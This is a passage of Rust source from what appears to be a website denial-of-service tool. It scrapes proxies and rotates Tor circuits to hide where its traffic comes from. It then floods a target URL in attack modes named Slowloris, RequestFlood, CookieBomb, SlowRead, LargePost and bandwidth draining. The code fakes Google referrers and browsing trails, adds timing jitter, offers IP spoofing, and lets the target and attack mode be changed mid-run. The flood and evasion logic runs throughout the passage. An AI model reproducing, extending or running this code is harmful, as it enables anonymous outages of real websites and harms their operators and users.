                let mut lock = ss.lock().await;
                lock.tcp_checked = n as u32;
                lock.status_msg = format!("Checked: {}/{}", n, total);
            }
            if alive {
                Some(p)
            } else {
                None
            }
        }));
    }
    let mut alive_proxies = Vec::new();
    for x in h {
        if let Ok(Some(p)) = x.await {
            alive_proxies.push(p);
        }
    }
    alive_proxies
}

async fn warm_tor_circuits(proxies: &[String], target_url: &str, timeout_secs: u64, gap_secs: u64) {
    for (i, proxy_url) in proxies.iter().enumerate() {
        let warmup_url = format!("{}{}", target_url.trim_end_matches('/'), "/");
        let proxy = match reqwest::Proxy::all(proxy_url) {
            Ok(p) => p,
            Err(e) => {
                eprintln!("  Warning: failed to parse proxy {} for warm-up: {}", i, e);
                continue;
            }
        };
        let client = match reqwest::Client::builder()
            .proxy(proxy)
            .timeout(Duration::from_secs(timeout_secs))
            .build()
        {
            Ok(c) => c,
            Err(e) => {
                eprintln!("  Warning: failed to build client for proxy {}: {}", i, e);
                continue;
            }
        };
        let start = Instant::now();
        eprintln!("  Warming circuit {} via {} to {}...", i, proxy_url, warmup_url);
        match tokio::time::timeout(Duration::from_secs(timeout_secs), client.head(&warmup_url).send()).await {
            Ok(Ok(resp)) => {
                let status = resp.status();
                let elapsed = start.elapsed().as_millis();
                eprintln!("  Circuit {} warmed: {} in {}ms", i, status, elapsed);
            }
            Ok(Err(e)) => {
                eprintln!("  Circuit {} warm-up failed: {}", i, e);
            }
            Err(_) => {
                eprintln!("  Circuit {} warm-up timed out after {}s", i, timeout_secs);
            }
        }
        if i + 1 < proxies.len() {
            tokio::time::sleep(Duration::from_secs(gap_secs)).await;
        }
    }
}

async fn get_proxies(mode: ProxyMode, state: &Arc<Mutex<AppState>>) -> Option<Vec<String>> {
    let (config, target_url, tor_proxy_opt) = {
        let st = state.lock().await;
        (st.client_config.clone(), st.target_url.clone(), st.tor_proxy.clone())
    };
    match mode {
        ProxyMode::Tor => {
            state.lock().await.status_msg = "Checking Tor...".to_string();
            let ok = tokio::time::timeout(Duration::from_secs(3), tokio::net::TcpStream::connect("127.0.0.1:9050")).await.ok().and_then(|r| r.ok()).is_some();
            let n_unique = 3usize;
            if ok {
                state.lock().await.status_msg = "Tor ready".to_string();
                let mut proxies = Vec::with_capacity(n_unique);
                for i in 0..n_unique {
                    proxies.push(format!("socks5h://tor{}:isolate@127.0.0.1:9050", i));
                }
                // Warm up circuits with HEAD to actual target
                state.lock().await.status_msg = format!("Warming {} Tor circuits...", n_unique);
                warm_tor_circuits(&proxies, &target_url, 20, 2).await;
                Some(proxies)
            } else if let Ok(custom) = std::env::var("TOR_PROXY") {
                let base = custom.trim_end_matches('?').trim_end_matches('/');
                let base = if let Some(pos) = base.find('@') { &base[pos+1..] } else { base };
                state.lock().await.status_msg = format!("Using TOR_PROXY: {}", base);
                let mut proxies = Vec::with_capacity(n_unique);
                for i in 0..n_unique {
                    proxies.push(format!("socks5h://tor{}:isolate@{}", i, base));
                }
                warm_tor_circuits(&proxies, &target_url, 20, 2).await;
                Some(proxies)
            } else {
                state.lock().await.status_msg = "Tor unavailable".to_string();
                None
            }
        }
        ProxyMode::Scrape | ProxyMode::ScrapeTorFallback => {
            state.lock().await.status_msg = "Scraping proxies...".to_string();
            let effective_tor_proxy = if let Some(ref p) = tor_proxy_opt {
                Some(p.clone())
            } else if mode == ProxyMode::ScrapeTorFallback {
                Some("socks5h://127.0.0.1:9050".to_string())
            } else {
                None
            };
            let mut builder = browser_client_builder(&config).redirect(reqwest::redirect::Policy::limited(config.max_redirects)).timeout(Duration::from_secs(15));
            if let Some(ref p) = effective_tor_proxy {
                if let Ok(proxy_val) = reqwest::Proxy::all(p) {
                    builder = builder.proxy(proxy_val);
                }
            }
            let c = match builder.build() { Ok(c) => c, Err(_) => return None, };
            let scraped = match tokio::time::timeout(Duration::from_secs(30), scrape_all(&c, state)).await {
                Ok(res) => {
                    println!("  Scraped {} proxy candidates from online sources.", res.len());
                    res
                }
                Err(_) => {
                    let mut st = state.lock().await;
                    st.status_msg = "Proxy scraping timed out".to_string();
                    vec![]
                }
            };
            if scraped.is_empty() {
                if mode == ProxyMode::ScrapeTorFallback { /* fall through to Tor */ }
                else { state.lock().await.status_msg = "No proxies scraped".to_string(); return None; }
            }
            state.lock().await.status_msg = format!("{} proxies scraped", scraped.len());
            state.lock().await.total_scraped = scraped.len();
            
            let sample: Vec<String> = {
                use rand::seq::SliceRandom;
                let mut rng = rand::rng();
                let mut shuffled_scraped = scraped;
                shuffled_scraped.shuffle(&mut rng);
                shuffled_scraped.into_iter().take(3000).collect()
            };
            let alive = filter_alive_proxies(&sample, &target_url, &config, state).await;
            state.lock().await.total_alive = alive.len(); state.lock().await.status_msg = format!("TCP alive: {}", alive.len());
            let mut result = alive;
            result.sort(); result.dedup();
            if result.is_empty() && mode == ProxyMode::ScrapeTorFallback {
                state.lock().await.status_msg = "Scrape failed, Tor fallback...".to_string();
                if tokio::time::timeout(Duration::from_secs(3), tokio::net::TcpStream::connect("127.0.0.1:9050")).await.ok().and_then(|r| r.ok()).is_some() {
                    return Some(vec!["socks5h://tor:isolate@127.0.0.1:9050".to_string()]);
                } else { state.lock().await.status_msg = "Tor fallback unavailable".to_string(); return None; }
            }
            if result.is_empty() { None } else { result.sort(); result.dedup(); Some(result) }
        }
    }
}

async fn run_load(state: Arc<Mutex<AppState>>, pool: Arc<std::sync::Mutex<ProxyPool>>, stats: Stats, delay_ms: u64, max_errors: Option<u64>) {
    let (mut conc, interval, attack, sessions, _, apis, _statics, rate_limit, verbose) = {
        let st = state.lock().await;
        (st.load_concurrency, st.interval_ms, st.attack_mode, st.sessions.clone(), st.jitter_ms, st.apis.clone(), st.statics.clone(), st.rate_limit, st.verbose)
    };
    let mut jitter_ms;
    let mut semaphore = Arc::new(Semaphore::new(conc));

    loop {
        if let Some(max_err) = max_errors {
            if stats.errors.load(Ordering::Relaxed) >= max_err {
                println!("  Max errors ({}) reached, stopping.", max_err);
                break;
            }
        }
        if !stats.running.load(Ordering::Relaxed) { tokio::time::sleep(Duration::from_millis(100)).await; continue; }
        
        let (new_conc, new_jitter, target_url) = {
            let st = state.lock().await;
            (st.load_concurrency, st.jitter_ms, st.target_url.clone())
        };
        if target_url.is_empty() { tokio::time::sleep(Duration::from_millis(100)).await; continue; }
        let _ = Url::parse(&target_url).ok();

        if new_conc != conc {
            conc = new_conc;
            semaphore = Arc::new(Semaphore::new(conc));
        }
        jitter_ms = new_jitter;

        let (imgs, apis_local, statics_local, _has_isr, _has_cache_bypass, _has_log_drains, _has_storage) = {
            let st = state.lock().await; (st.imgs.clone(), st.apis.clone(), st.statics.clone(), st.has_isr, st.has_cache_bypass, st.has_log_drains, st.has_storage)
        };
        tokio::task::yield_now().await;
        let assets: Vec<String> = match attack {
            AttackMode::Normal => { if statics_local.is_empty() { vec!["/".into()] } else { statics_local.clone() } },
            AttackMode::ImageOpt => { if imgs.is_empty() { vec!["/".into()] } else { imgs.clone() } },
            AttackMode::Ssr => { if apis_local.is_empty() { vec!["/".into()] } else { apis_local.clone() } },
            AttackMode::Middleware => { if statics_local.is_empty() { vec!["/".into()] } else { statics_local.clone() } },
            _ => vec!["/".into()]
        };

        loop {
            if !stats.running.load(Ordering::Relaxed) { break; }
            let active_concurrency = stats.concurrency.load(Ordering::Relaxed);
            if active_concurrency != conc {
                break; // Recreate semaphore
            }
            
            let _permit = match semaphore.clone().acquire_owned().await { Ok(p) => p, Err(_) => return, };
            
            // Rate limiting: if rate_limit is Some(n), enforce max requests per second
            if let Some(rate) = rate_limit {
                if rate > 0 {
                    let interval_ms = 1000u64.saturating_div(rate);
                    tokio::time::sleep(Duration::from_millis(interval_ms)).await;
                }
            }
            
            let next_client = match pool.lock() {
                Ok(mut guard) => guard.next(),
                Err(e) => {
                    eprintln!("  Pool lock poisoned: {}", e);
                    continue;
                }
            };
            if let Some((idx, client)) = next_client {
                let stats_clone = stats.clone();
                let assets = assets.clone();
                let target = target_url.clone();
                let sessions_clone = sessions.clone();
                let idx1 = rand::rng().random_range(0..assets.len());
                let pool_clone = pool.clone();
                let apis_clone = apis.clone();
                
                // Determine latency and delay details
                let mut req_delay = delay_ms;
                if req_delay == 0 {
                    req_delay = interval;
                }
                if jitter_ms > 0 {
                    let mut rng = rand::rng();
                    let min_d = req_delay.saturating_sub(jitter_ms);
                    let max_d = req_delay.saturating_add(jitter_ms);
                    req_delay = rng.random_range(min_d..=max_d);
                }

                let permit_clone = _permit;
                tokio::spawn(async move {
                    let _permit = permit_clone;
                    let start_req = Instant::now();
                    
                    // Realistic referrer trail / navigation funnel logic for Normal/AssetSpray
                    let (req_url, referrer) = if (attack == AttackMode::Normal || attack == AttackMode::AssetSpray) && !assets.is_empty() {
                        let step = rand::rng().random_range(0..3);
                        if step == 0 {
                            (target.clone(), Some("https://www.google.com/".to_string()))
                        } else if step == 1 {
                            (assets[idx1].clone(), Some(target.clone()))
                        } else {
                            let path = if !apis_clone.is_empty() {
                                apis_clone[rand::rng().random_range(0..apis_clone.len())].clone()
                            } else {
                                target.clone()
                            };
                            (path, Some(format!("{}/about", target.trim_end_matches('/'))))
                        }
                    } else {
                        (if assets.is_empty() { target.clone() } else { assets[idx1].clone() }, None)
                    };

                    let result = match attack {
                        AttackMode::Bandwidth => {
                            fetch_bandwidth(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose).await
                        }
                        AttackMode::Normal => {
                            fetch_page_with_referrer(client, req_url, referrer, req_delay, idx, sessions_clone.clone(), verbose).await
                        }
                        AttackMode::SlowRead => {
                            fetch_slow(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose).await
                        }
                        AttackMode::ImageOpt => {
                            if assets.is_empty() { fetch_page(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose).await }
                            else { fetch_range(client, assets[idx1].clone(), req_delay, idx, sessions_clone.clone(), verbose).await }
                        }
                        AttackMode::LargePost => {
                            fetch_post(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose).await
                        }
                        AttackMode::AssetSpray => {
                            fetch_page_with_referrer(client, req_url, referrer, req_delay, idx, sessions_clone.clone(), verbose).await
                        }
                        AttackMode::RangeReq => {
                            if assets.is_empty() { fetch_range(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose).await }
                            else { fetch_range(client, assets[idx1].clone(), req_delay, idx, sessions_clone.clone(), verbose).await }
                        }
                        AttackMode::CookieBomb => {
                            fetch_cookie(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose).await
                        }
                        AttackMode::Ssr => {
                            if assets.is_empty() { fetch_page(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose).await }
                            else { fetch_page(client, assets[idx1].clone(), req_delay, idx, sessions_clone.clone(), verbose).await }
                        }
                        AttackMode::Middleware => {
                            if assets.is_empty() { fetch_page(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose).await }
                            else { fetch_page(client, assets[idx1].clone(), req_delay, idx, sessions_clone.clone(), verbose).await }
                        }
                        AttackMode::RequestFlood => {
                            fetch_page(client, target.clone(), 0, idx, sessions_clone.clone(), verbose).await
                        }
                        AttackMode::NotFound => {
                            let path = format!("/nonexistent-{:08x}", rand::random::<u32>());
                            fetch_page(client, format!("{}{}", target.trim_end_matches('/'), path), req_delay, idx, sessions_clone.clone(), verbose).await
                        }
                        AttackMode::Slowloris => {
                            fetch_slowloris(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose).await
                        }
                    };
                    let latency = start_req.elapsed().as_millis() as u64;
                    stats_clone.latency_samples.record(latency as u32);
                    
                    match result {
                        Ok((bytes, status)) => {
                            stats_clone.total_requests.fetch_add(1, Ordering::Relaxed);
                            stats_clone.total_bytes.fetch_add(bytes as u64, Ordering::Relaxed);
                            stats_clone.total_latency_ms.fetch_add(latency, Ordering::Relaxed);
                            match status {
                                200..=299 => { stats_clone.status_2xx.fetch_add(1, Ordering::Relaxed); }
                                300..=399 => { stats_clone.status_3xx.fetch_add(1, Ordering::Relaxed); }
                                400..=499 => { stats_clone.status_4xx.fetch_add(1, Ordering::Relaxed); }
                                500..=599 => { stats_clone.status_5xx.fetch_add(1, Ordering::Relaxed); }
                                _ => { stats_clone.status_other.fetch_add(1, Ordering::Relaxed); }
                            }
                            match pool_clone.lock() {
                                Ok(mut guard) => guard.report_success(idx, latency),
                                Err(e) => {
                                    eprintln!("  Pool lock poisoned: {}", e);
                                }
                            }
                        }
                        Err(err) => {
                            if err.downcast_ref::<reqwest::Error>().is_some_and(|e| e.is_timeout()) {
                                stats_clone.error_timeout.fetch_add(1, Ordering::Relaxed);
                            } else if err.downcast_ref::<reqwest::Error>().is_some_and(|e| e.is_connect()) {
                                stats_clone.error_connect.fetch_add(1, Ordering::Relaxed);
                            } else {
                                stats_clone.error_other.fetch_add(1, Ordering::Relaxed);
                            }
                            stats_clone.errors.fetch_add(1, Ordering::Relaxed);
                            match pool_clone.lock() {
                                Ok(mut guard) => guard.report_failure(idx),
                                Err(e) => {
                                    eprintln!("  Pool lock poisoned: {}", e);
                                }
                            }
                        }
                    }
                });
            } else {
                tokio::task::yield_now().await;
                tokio::time::sleep(Duration::from_millis(10)).await;
            }
        }
        
        let sleep_time = if interval == 0 { 1 } else { interval };
        tokio::time::sleep(Duration::from_millis(sleep_time)).await;
    }
}

fn write_probe_csv(path: &str, target: &str, status: &str, proxies: &[String], concurrency: usize, attack: &str) {
    let status_escaped = status.replace(',', ";");
    let content = format!("target,status,proxy_count,concurrency,attack_mode\n{},{},{},{},{}\n", target, status_escaped, proxies.len(), concurrency, attack);
    if let Err(e) = std::fs::write(path, content) {
        eprintln!("  Failed to write CSV to {}: {}", path, e);
    } else {
        println!("  CSV written to {}", path);
    }
}

struct ResultsCsvParams<'a> {
    target: &'a str,
    status: &'a str,
    proxies: &'a [String],
    concurrency: usize,
    attack: &'a str,
    total_reqs: u64,
    total_bytes: u64,
    duration: u64,
}

fn write_results_csv(path: &str, params: ResultsCsvParams<'_>) {
    let status_escaped = params.status.replace(',', ";");
    let content = format!("target,status,proxy_count,concurrency,attack_mode,total_requests,total_bytes,duration_sec,kb_per_sec\n{},{},{},{},{},{},{},{},{:.2}\n",
        params.target, status_escaped, params.proxies.len(), params.concurrency, params.attack,
        params.total_reqs, params.total_bytes, params.duration, params.total_bytes as f64 / params.duration as f64 / 1024.0);
    if let Err(e) = std::fs::write(path, content) {
        eprintln!("  Failed to write CSV to {}: {}", path, e);
    } else {
        println!("  CSV written to {}", path);
    }
}

/// Resolve a Tor control address to a connection target.
/// Tries Unix socket paths first (standard on modern Tor), then falls back to TCP.
fn resolve_control_addr(addr: &str) -> Result<(String, String), String> {
    // If addr is already TCP (host:port), use it directly
    if addr.contains(':') && !addr.starts_with('/') {
        return Ok((addr.to_string(), "tcp".to_string()));
    }
    // If addr starts with '/', treat as Unix socket path
    if addr.starts_with('/') {
        return Ok((addr.to_string(), "unix".to_string()));
    }
    // Otherwise try common Unix socket paths, then TCP
    let unix_paths = [
        "/run/tor/control",
        "/var/run/tor/control",
        "/tmp/tor/control",
        "/home/tor/.local/share/tor/control_socket",
    ];
    for p in &unix_paths {
        if std::fs::metadata(p).is_ok() {
            return Ok((p.to_string(), "unix".to_string()));
        }
    }
    // Fall back to TCP
    Ok((format!("127.0.0.1:{}", addr.parse::<u16>().unwrap_or(9051)), "tcp".to_string()))
}

/// Read the Tor control cookie file for cookie authentication.
fn read_control_cookie(_socket_path: &str) -> Option<String> {
    // Try common cookie locations
    let cookie_paths = [
        "/var/lib/tor/control_auth_cookie",
        "/home/tor/.config/tor/auth_cookie",
        "/run/tor/control_auth_cookie",
        "/run/tor/control.authcookie",
        "/var/run/tor/control_auth_cookie",
        "/var/run/tor/control.authcookie",
        "/home/tor/.local/share/tor/control_auth_cookie",
    ];
    for p in &cookie_paths {
        if let Ok(bytes) = std::fs::read(p) {
            // Cookie is hex-encoded bytes; most modern Tor installs write 32 raw bytes
            // (no length prefix). Older formats had a 2-byte length prefix — try both.
            if bytes.len() > 2 {
                // Try without length prefix first (modern format)
                let hex_str: String = bytes.iter().map(|b| format!("{:02x}", b)).collect();
                if hex_str.len() == 64 {
                    return Some(hex_str);
                }
                // Fall back: try skipping 2-byte length prefix
                let hex_str: String = bytes[2..].iter().map(|b| format!("{:02x}", b)).collect();
                if hex_str.len() == 64 {
                    return Some(hex_str);
                }
            }
        }
    }
    None
}

/// Send a command over a Tor control connection with optional cookie auth.
/// Supports both TCP and Unix socket connections.
async fn tor_control_command(
    control_addr: &str,
    command: &str,
) -> Result<String, Box<dyn std::error::Error + Send + Sync>> {
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    let (conn_target, conn_type) = resolve_control_addr(control_addr)?;

    // Helper: send bytes and read response with a timeout
    async fn send_and_read(
        stream: &mut (impl tokio::io::AsyncWrite + tokio::io::AsyncRead + Unpin + Send),
        data: &[u8],
        read_timeout_secs: u64,
    ) -> Result<String, Box<dyn std::error::Error + Send + Sync>> {
        stream.write_all(data).await?;
        stream.flush().await?;
        let mut buf = [0u8; 4096];
        let n = {
            use tokio::time::{timeout, Duration};
            let read_result = timeout(Duration::from_secs(read_timeout_secs), stream.read(&mut buf)).await;
            read_result.unwrap_or(Ok(0))?
        };
        Ok(std::str::from_utf8(&buf[..n]).unwrap_or("").trim().to_string())
    }

    if conn_type == "unix" {
        use tokio::net::UnixStream;
        let mut stream = UnixStream::connect(&conn_target).await?;
        let cookie = read_control_cookie(&conn_target);
        let auth_result = if let Some(ref cookie_hex) = cookie {
            send_and_read(&mut stream, format!("AUTHENTICATE \"{}\"\r\n", cookie_hex).as_bytes(), 5).await?
        } else {
            send_and_read(&mut stream, b"AUTHENTICATE \"\"\r\n", 5).await?
        };

        if !auth_result.contains("250 OK") {
            return Err(format!("Auth failed: {}", auth_result).into());
        }

        let response = send_and_read(&mut stream, command.as_bytes(), 10).await?;
        send_and_read(&mut stream, b"QUIT\r\n", 2).await?;
        Ok(response)
    } else {
        let mut stream = tokio::net::TcpStream::connect(&conn_target).await?;
        let cookie = read_control_cookie(&conn_target);
        let auth_result = if let Some(ref cookie_hex) = cookie {
            send_and_read(&mut stream, format!("AUTHENTICATE \"{}\"\r\n", cookie_hex).as_bytes(), 5).await?
        } else {
            send_and_read(&mut stream, b"AUTHENTICATE \"\"\r\n", 5).await?
        };

        if !auth_result.contains("250 OK") {
            return Err(format!("Auth failed: {}", auth_result).into());
        }

        let response = send_and_read(&mut stream, command.as_bytes(), 10).await?;
        send_and_read(&mut stream, b"QUIT\r\n", 2).await?;
        Ok(response)
    }
}

async fn cycle_tor_circuit(control_addr: &str) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let resp = tor_control_command(control_addr, "SIGNAL NEWNYM\r\n").await?;
    if !resp.contains("250") {
        eprintln!("  [Tor] NEWNYM response: {}", resp);
    }
    Ok(())
}

async fn configure_tor(
    control_addr: &str,
    entry_guards: Option<&str>,
    bridges: Option<&str>,
    circuit_timeout: Option<u64>,
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    if let Some(guards) = entry_guards {
        let cmd = format!("SETCONF EntryNodes=\"{}\" StrictNodes=1\r\n", guards);
        let resp = tor_control_command(control_addr, &cmd).await?;
        if !resp.contains("250") {
            eprintln!("  [Tor] SETCONF EntryNodes response: {}", resp);
        }
    }

    if let Some(brs) = bridges {
        let mut cmd = "SETCONF UseBridges=1".to_string();
        for br in brs.split(';') {
            let trimmed = br.trim();
            if !trimmed.is_empty() {
                cmd.push_str(&format!(" Bridge=\"{}\"", trimmed));
            }
        }
        cmd.push_str("\r\n");
        let resp = tor_control_command(control_addr, &cmd).await?;
        if !resp.contains("250") {
            eprintln!("  [Tor] SETCONF bridges response: {}", resp);
        }
    }

    if let Some(timeout) = circuit_timeout {
        let cmd = format!("SETCONF CircuitBuildTimeout={}\r\n", timeout);
        let resp = tor_control_command(control_addr, &cmd).await?;
        if !resp.contains("250") {
            eprintln!("  [Tor] SETCONF timeout response: {}", resp);
        }
    }

    Ok(())
}

async fn listen_stdin(state: Arc<Mutex<AppState>>) {
    use tokio::io::{AsyncBufReadExt, BufReader};
    let stdin = tokio::io::stdin();
    let mut reader = BufReader::new(stdin).lines();
    loop {
        // Yield to prevent locking out tokio executor on empty input
        tokio::task::yield_now().await;
        match reader.next_line().await {
            Ok(Some(line)) => {
                let trimmed = line.trim();
                if trimmed.is_empty() { continue; }
                if let Some(pos) = trimmed.find('=') {
                    let key = trimmed[..pos].trim();
                    let val = trimmed[pos+1..].trim();
                    let mut st = state.lock().await;
                    match key {
                        "concurrency" => {
                            if let Ok(parsed) = val.parse::<usize>() {
                                st.load_concurrency = parsed;
                                st.stats.concurrency.store(parsed, Ordering::Relaxed);
                                println!("  [System] Dynamic concurrency updated to {}", parsed);
                            }
                        }
                        "jitter" => {
                            if let Ok(parsed) = val.parse::<u64>() {
                                st.jitter_ms = parsed;
                                println!("  [System] Dynamic jitter updated to {}ms", parsed);
                            }
                        }
                        "delay" => {
                            if let Ok(parsed) = val.parse::<u64>() {
                                st.interval_ms = parsed;
                                println!("  [System] Dynamic delay updated to {}ms", parsed);
                            }
                        }
                        "attack" => {
                            st.attack_mode = AttackMode::from_str(val);
                            println!("  [System] Dynamic attack mode updated to {}", st.attack_mode);
                        }
                        "target" | "target_url" => {
                            st.target_url = val.to_string();
                            println!("  [System] Dynamic target updated to {}", val);
                            let state_clone = Arc::clone(&state);
                            let target_clone = val.to_string();
                            tokio::spawn(async move {
                                probe_domain(&target_clone, &state_clone).await;
                            });
                        }
                        "spoof_ip" => {
                            let parsed = val == "true" || val == "1";
                            SPOOF_IP.store(parsed, Ordering::Relaxed);
                            println!("  [System] Dynamic spoof_ip updated to {}", parsed);
                        }
                        _ => {}
                    }
                }
            }
            Ok(None) => {
                // EOF reached (stdin closed by parent process)
                break;
            }
            Err(_) => {
                break;
            }
        }
    }
}

async fn resolve_target_dns(target_url: &str) -> Option<std::net::IpAddr> {
    let u = Url::parse(target_url).ok()?;
    let host = u.host_str()?;
    if host.contains("localhost") || host.contains("127.0.0.1") || host.ends_with(".onion") {
        return None;
    }
    let mut addrs = tokio::net::lookup_host(format!("{}:443", host)).await.ok()?;
    addrs.next().map(|addr| addr.ip())
}

fn format_time_now() -> String {
    use std::time::{SystemTime, UNIX_EPOCH};
    let secs = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    let days = secs / 86400;
    let remainder = secs % 86400;
    let hours = remainder / 3600;
    let minutes = (remainder % 3600) / 60;
    let seconds = remainder % 60;
    // Simple date from days since epoch (1970-01-01)
    let mut d = days;
    let mut year = 1970u32;
    while d >= 365u64 {
        let leap = (year.is_multiple_of(4) && !year.is_multiple_of(100)) || year.is_multiple_of(400);
        let yd = if leap { 366 } else { 365 };
        if d < yd as u64 { break; }
        d -= yd as u64;
        year += 1;
    }
    // Simple month/day from day-of-year
    let months = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31];
    let leap = (year.is_multiple_of(4) && !year.is_multiple_of(100)) || year.is_multiple_of(400);
    let mut month = 1u32;
    let mut day = d + 1;
    for m in &months {
        let mut ml = *m as u64;
        if month == 2 && leap { ml += 1; }
        if day <= ml { break; }
        day -= ml;
        month += 1;
    }
    format!("{:04}-{:02}-{:02} {:02}:{:02}:{:02}", year, month, day, hours, minutes, seconds)
}

/// Gradually increases concurrency from 1 to `target` over `ramp_up_secs` seconds.
/// Each tick sleeps for `(ramp_up_secs / target)` seconds, then increments concurrency.
async fn ramp_up_concurrency(state: Arc<Mutex<AppState>>, target: usize, ramp_up_secs: u64) {
    if ramp_up_secs == 0 || target <= 1 { return; }
    let tick_ms = (ramp_up_secs as f64 / target as f64 * 1000.0).max(200.0) as u64;
    println!("  Ramping up concurrency: 1 → {} over {}s (tick = {}ms)", target, ramp_up_secs, tick_ms);
    for c in 2..=target {
        tokio::time::sleep(Duration::from_millis(tick_ms)).await;
        let mut st = state.lock().await;
        st.load_concurrency = c;
        st.stats.concurrency.store(c, Ordering::Relaxed);
        println!("  Ramp-up: concurrency = {}", c);
    }
    println!("  Ramp-up complete: reached concurrency = {}", target);
}

#[tokio::main]
async fn main() {
    let args: Vec<String> = std::env::args().collect();
    // Parse flags
    let mut tor_only = false;
    let mut dry_run = false;
    let mut verify = false;
    let mut version = false;
    let mut list_modes = false;
    let mut save_proxies: Option<String> = None;
    let mut output_csv: Option<String> = None;
    let mut proxy_file: Option<String> = None;
    let mut tor_proxy: Option<String> = None;
    let mut delay_ms: u64 = 0;
    let mut max_errors: Option<u64> = None;
    let mut config_file: Option<String> = None;
    let mut custom_headers: Vec<String> = Vec::new();
    let mut positional: Vec<String> = Vec::new();

    // New configuration variables
    let mut custom_selector: Option<String> = None;
    let mut pool_max_idle = 20usize;
    let mut pool_idle_timeout_secs = 90u64;
    let mut tor_control = "127.0.0.1:9051".to_string();
    let mut tor_entry_guards: Option<String> = None;
    let mut tor_bridges: Option<String> = None;
    let mut tor_circuit_timeout: Option<u64> = None;
    let mut tor_ssthresh = 20usize;
    let mut sni: Option<String> = None;
    let mut user_agent: Option<String> = None;
    let mut jitter_ms = 0u64;
    let mut auto_tune = false;
    let mut tui = false;
    let mut insecure = false;
    let mut spoof_ip = false;
    let mut quiet = false;
    let mut json_output = false;
    let mut verbose = false;
    let mut rate_limit: Option<u64> = None;
    let mut max_redirects: usize = 10;
    let mut rotation_strategy = String::from("weighted");  // weighted, round-robin, random
    let mut log_file: Option<String> = None;
    let mut canary = false;
    let mut report_file: Option<String> = None;
    let mut stats_interval_secs: u64 = 5;
    let mut tor_circuits: usize = 10;
    let mut ramp_up_secs: u64 = 0;

    let mut args_iter = args.into_iter().skip(1);
    while let Some(arg) = args_iter.next() {
        match arg.as_str() {
            "-h" | "--help" => {
                print_help();
                return;
            }
            "-v" | "--version" => version = true,
            "--list-modes" => list_modes = true,
            "--tor-only" => tor_only = true,
            "--verify" => verify = true,
            "--dry-run" => dry_run = true,
            "--output" => {
                if let Some(val) = args_iter.next() {
                    output_csv = Some(val);
                }
            }
            "--proxy-file" => {
                if let Some(val) = args_iter.next() {
                    proxy_file = Some(val);
                }
            }
            "--tor-proxy" => {
                if let Some(val) = args_iter.next() {
                    tor_proxy = Some(val);
                }
            }
            "--delay" => {
                if let Some(val) = args_iter.next() {
                    delay_ms = val.parse().unwrap_or(0);
                }
            }
            "--max-errors" => {
                if let Some(val) = args_iter.next() {
                    max_errors = val.parse().ok();
                }
            }
            "--save-proxies" => {
                if let Some(val) = args_iter.next() {
                    save_proxies = Some(val);
                }
            }
            "--config" => {
                if let Some(val) = args_iter.next() {
                    config_file = Some(val);
                }
            }
            "--custom-header" => {
                if let Some(val) = args_iter.next() {
                    custom_headers.push(val);
                }
            }
            "--custom-selector" => {
                if let Some(val) = args_iter.next() {
                    custom_selector = Some(val);
                }
            }
            "--pool-max-idle" => {
                if let Some(val) = args_iter.next() {
                    pool_max_idle = val.parse().unwrap_or(20);
                }
            }
            "--pool-idle-timeout" => {
                if let Some(val) = args_iter.next() {
                    pool_idle_timeout_secs = val.parse().unwrap_or(90);
                }
            }
            "--tor-control" => {
                if let Some(val) = args_iter.next() {
                    tor_control = val;
                }
            }
            "--tor-entry-guards" => {
                if let Some(val) = args_iter.next() {
                    tor_entry_guards = Some(val);
                }
            }
            "--tor-bridges" => {
                if let Some(val) = args_iter.next() {
                    tor_bridges = Some(val);
                }
            }
            "--tor-circuit-timeout" => {
                if let Some(val) = args_iter.next() {
                    tor_circuit_timeout = val.parse().ok();
                }
            }
            "--tor-ssthresh" => {
                if let Some(val) = args_iter.next() {
                    tor_ssthresh = val.parse().unwrap_or(20);
                }
            }
            "--sni" => {
                if let Some(val) = args_iter.next() {
                    sni = Some(val);
                }
            }
            "--user-agent" => {
                if let Some(val) = args_iter.next() {
                    user_agent = Some(val);
                }
            }
            "--jitter" => {
                if let Some(val) = args_iter.next() {
                    jitter_ms = val.parse().unwrap_or(0);
                }
            }
            "--auto-tune" => auto_tune = true,
            "--tui" => tui = true,
            "--insecure" => insecure = true,
            "--spoof-ip" => spoof_ip = true,
            "--quiet" => quiet = true,
            "--verbose" => verbose = true,
            "--json" => json_output = true,
            "--rate" => {
                if let Some(val) = args_iter.next() {
                    rate_limit = val.parse().ok();
                }
            }
            "--max-redirects" => {
                if let Some(val) = args_iter.next() {
                    max_redirects = val.parse().unwrap_or(10);
                }
            }
            "--rotation-strategy" => {
                if let Some(val) = args_iter.next() {
                    if val == "round-robin" || val == "random" || val == "weighted" {
                        rotation_strategy = val.to_string();
                    }
                }
            }
            "--log-file" => {
                if let Some(val) = args_iter.next() {
                    log_file = Some(val);
                }
            }
            "--canary" => canary = true,
            "--report" => {
                if let Some(val) = args_iter.next() {
                    report_file = Some(val);
                }
            }
            "--stats-interval" => {
                if let Some(val) = args_iter.next() {
                    stats_interval_secs = val.parse().unwrap_or(5);
                }
            }
            "--tor-circuits" => {
                if let Some(val) = args_iter.next() {
                    tor_circuits = val.parse().unwrap_or(10);
                }
            }
            "--ramp-up" => {
                if let Some(val) = args_iter.next() {
                    ramp_up_secs = val.parse().unwrap_or(0);
                }
            }
            "--body" => {
                if let Some(val) = args_iter.next() {
                    let _ = CUSTOM_POST_BODY.set(val);
                }
            }
            "--content-type" => {
                if let Some(val) = args_iter.next() {
                    let _ = CUSTOM_CONTENT_TYPE.set(val);
                }
            }
            other => {
                if other.starts_with("--output=") {
                    output_csv = Some(other.strip_prefix("--output=").unwrap_or("").to_string());
                } else if other.starts_with("--proxy-file=") {
                    proxy_file = Some(other.strip_prefix("--proxy-file=").unwrap_or("").to_string());
                } else if other.starts_with("--tor-proxy=") {
